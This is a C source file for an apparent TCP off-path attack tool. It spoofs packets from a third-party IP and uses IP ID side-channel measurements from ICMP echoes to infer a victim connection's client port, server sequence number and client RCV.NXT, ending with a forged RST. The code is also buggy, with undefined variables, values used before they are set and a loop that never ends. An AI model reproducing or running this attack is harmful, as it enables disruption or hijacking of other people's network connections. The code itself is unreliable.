#include <unistd.h>
#include <sys/time.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include "xlayer.h"
#include "datalink.h"


int
echo_get_id(struct datalink *dl,
                struct MAC *srcmac,
                struct MAC *dstmac,
		uint32_t real_ip,
                uint32_t src,
                uint32_t *dly,
                uint16_t *ip_id
		);
void
usage(const char *pgm)
{
 fprintf(stderr,"usage: %s <interface> <real ip> <gateway ip> <spoof ip> <server ip> <start port> <end port> <server port> [seq]\n",pgm);
 exit(0);
}

int
main(int argc, char **argv)
{

	struct layer *proto;
	struct MAC localmac,gwmac,cli_mac;
	uint32_t real_ip,spoof_ip,gw_ip,client_ip,server_ip,dly,
		dly_serv;
	struct TCPSocket ts;
	struct datalink icmp_dl,dl;
	uint16_t start_port,end_port,server_port,
		ip_id_a,ip_id_b,ip_id_d;
	unsigned long i;
	unsigned short guess_port,min_delta=-1;
	unsigned long guess_serv_seq,serv_seq=0;
	uint32_t start_guess,end_guess;
	unsigned long ack_m, ack_h,ack_l;
	int done;
	int guess_inc;
	int busy_factor;

	char icmp_filter[256];
	if( argc < 9 )
		usage(*argv);
	if( argc >=  10){
		errno = 0;
		serv_seq = strtoul(argv[9],NULL,10);
		if(errno)
			serv_seq =0;
	}

	srand(time(NULL));
	memset(&dl,0,sizeof(dl));
	if( if_openbyname(&dl,argv[1]) < 0 ){
		fprintf(stderr,"open_link_byname failed\n");
		return 1;
	}

	memset(&icmp_dl,0,sizeof(dl));
	if( if_openbyname(&icmp_dl,argv[1]) < 0 ){
		fprintf(stderr,"open_link_byname failed\n");
		return 1;
	}
	guess_port = start_port;
	str_to_ip(argv[2],&real_ip);	
	str_to_ip(argv[3],&gw_ip);	
	str_to_ip(argv[4],&spoof_ip);	
	str_to_ip(argv[5],&server_ip);	
	memcpy(&localmac.mac,dl.dl_mac,6);

	snprintf(icmp_filter,sizeof(icmp_filter),"icmp and icmp[0] = 0 and "
		"((src %s and dst %s) or (src %s and dst %s))",
		argv[4],argv[2],argv[5],argv[2]);
	filterDatalink(&icmp_dl,icmp_filter);
	if( dl.dl_pcap->linktype == DLT_EN10MB ){
		if( ARPRequest(&dl,&localmac,&gwmac,real_ip,server_ip,5) < 0 ){
			fprintf(stderr,"lan gateway did not reply arp\n");
		exit(1);
		}



		if( ARPRequest(&dl,&localmac,&cli_mac,real_ip,spoof_ip,5) < 0 ){
			fprintf(stderr,"lan gateway did not reply arp\n");
		exit(1);
		}

	}
	start_port = atoi(argv[6]);
	end_port = atoi(argv[7]);
	server_port = atoi(argv[8]);
	createSocket(&ts,&localmac,&gwmac,spoof_ip,
		server_ip,start_port,server_port);
	ts.rcvwin = 0;
	
	ip_id_a = ip_id_b = ip_id_d = 0;
	echo_get_id(&icmp_dl,&localmac,&gwmac,real_ip,server_ip,
		&dly,&ip_id_a);
	printf("delay to server= %lu\n",dly_serv);		

	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
		&dly,&ip_id_a);
	printf("delay = %lu\n",dly);		
	for( i = start_port; i<= end_port; i++ ){

		SYN(&ts,&dl);
		
		usleep((dly+dly_serv));
        echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);

		ip_id_d = ip_id_b - ip_id_a;
		ip_id_a = ip_id_b;
		if(ip_id_d < min_delta){
			min_delta = ip_id_d;
			guess_port = i;
		}

		printf("for port %d ip_id delta = %x\n",ts.port,ip_id_d);			
		if(ip_id_d == 0 ){
			printf( " the client port is: %d\n",ts.port);	exit(0);
		}

		ts.port++;
		ts.seq++;
	}
	printf("guessed port is %d\n",guess_port);
	ts.ip = server_ip;
	ts.port = server_port;
	ts.hostip = spoof_ip;
	ts.hostport = guess_port;

	printf("finding serv.seq using 16k window\n");
	min_delta = -1;
if(serv_seq != 0 )
{
	ts.seq = serv_seq+65536;
	ts.gatewaymac = cli_mac;

	echo_get_id(&icmp_dl,&localmac,&gwmac,real_ip,spoof_ip,
		
		&dly,&ip_id_a);


	ts.ack = 0;
	ACK(&ts,&dl);
 	//ts.ack = 2<<30;
	//ACK(&ts,&dl);
		
        echo_get_id(&icmp_dl,&localmac,&gwmac,real_ip,spoof_ip,
                &dly,&ip_id_b);

	ip_id_d = ip_id_b - ip_id_a;

	printf("for seq %lu delta = %d\n",serv_seq,ip_id_d);



	ts.seq = serv_seq;

	echo_get_id(&icmp_dl,&localmac,&gwmac,real_ip,spoof_ip,
		
		&dly,&ip_id_a);


	ts.ack = 0;
	ACK(&ts,&dl);
 	//ts.ack = 2<<30;
	//ACK(&ts,&dl);
		
    echo_get_id(&icmp_dl,&localmac,&gwmac,real_ip,spoof_ip,
                &dly,&ip_id_b);

	ip_id_d = ip_id_b - ip_id_a;

	printf("for seq %lu delta = %d\n",serv_seq+65536,ip_id_d);
	closeDatalink(&dl);
	closeDatalink(&icmp_dl);
	exit(0);
}
	ip_id_a = ip_id_b = ip_id_d = 0;

	ts.gatewaymac = cli_mac;

	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
		&dly,&ip_id_a);

	start_guess = 0xffffffff;
	end_guess = 16385;
	guess_inc = -16384;
	for( i = start_guess; abs(end_guess-i)>=0 ; i +=guess_inc ){


		ts.ack = 0;
		ts.seq = i;
		ACK(&ts,&dl);
	 	//ts.ack = 2<<30;
		//ts.seq=i;
		ACK(&ts,&dl);
		
        echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);

		ip_id_d = ip_id_b - ip_id_a;
		ip_id_a = ip_id_b;
		if(ip_id_d < min_delta){
			min_delta = ip_id_d;
			guess_serv_seq = i;
			if(min_delta == 1)
			{

				printf("for seq %lu ip_id delta = %x\n",ts.seq,ip_id_d);

				RST(&ts,&dl);
				exit(0);
			}

		}

		printf("for seq %lu ip_id delta = %x\n",ts.seq,ip_id_d);

	}

	printf("guessed sequence = %lu\n",guess_serv_seq);

	ts.seq = guess_serv_seq;


    
	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_a);

	ack_h = 0xffffffff;
	ack_l = 0;
	ack_m = (ack_l + ack_h)/2;
	busy_factor = 2;
	
	while( !done ){

		echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);
		ts.ack = ack_m;
		ACK(&ts,&dl);
		
		ip_id_d = ip_id_b - ip_id_a;
		ip_id_a = ip_id_b;
		
		if( ip_id_d < busy_factor ){
				ack_l = ack_m;
				ack_m = ( ack_h + ack_l) /2;
		}else{
				ack_h = ack_m;
				ack_m = ( ack_h + ack_l )/2;
		}

		if( ack_l >= ack_h )
				done = true;

		printf("ack_l = %lu ack_m = %lu ack_h = %lu delta = %lu\n",
			ack_l,ack_m,ack_h,ip_ad_d);

	}

	if(  ack_l == ack_h ){
		printf("Found client RCV.NXT to be %lu\n",acl_l);
		
	}else{
		printf("Could not find client RCV.NEXT\n");
	}

	RST(&ts,&dl);	
	closeDatalink(&dl);
	closeDatalink(&icmp_dl);
	return 0;
}
		
	
int
echo_get_id(struct datalink *dl,
		struct MAC *srcmac,
		struct MAC *dstmac,
		uint32_t real_ip,
		uint32_t src,
		uint32_t *dly,
		uint16_t *ip_id
		)
{

	struct timeval tva,tvb;
	struct layer *proto;
	int n;
	if(gettimeofday(&tva,NULL) < 0 ){
		fprintf(stderr,"gettimeofday returned error %s\n"			,strerror(errno));
		return -1;
	}


        ICMPEchoRequest(dl,srcmac,dstmac,real_ip,src,rand()%0xFFFF
, rand()%0xffff);


	proto = recvlayers(dl,&n);
	if( proto == NULL ){
		fprintf(stderr,"recvlayers returned error %s\n"
			,strerror(errno));
		return -1;
	}
	if(gettimeofday(&tvb,NULL) < 0 ){
		fprintf(stderr,"gettimeofday returned error %s\n"			,strerror(errno));
		return -1;
	}


	*dly = tvb.tv_usec - tva.tv_usec;

	proto = findlayer(proto,LT_IP);
	
 	fprintf(stderr,"ip_id=%x\n",ntohs(((xip)proto->proto)->ip_id));	
	if( proto == NULL ){
		fprintf(stderr,"findlayer returned error %s\n"
			,strerror(errno));
		return -1;
	}
	*ip_id = ntohs( ((xip)proto->proto)->ip_id);

	return 0;
}
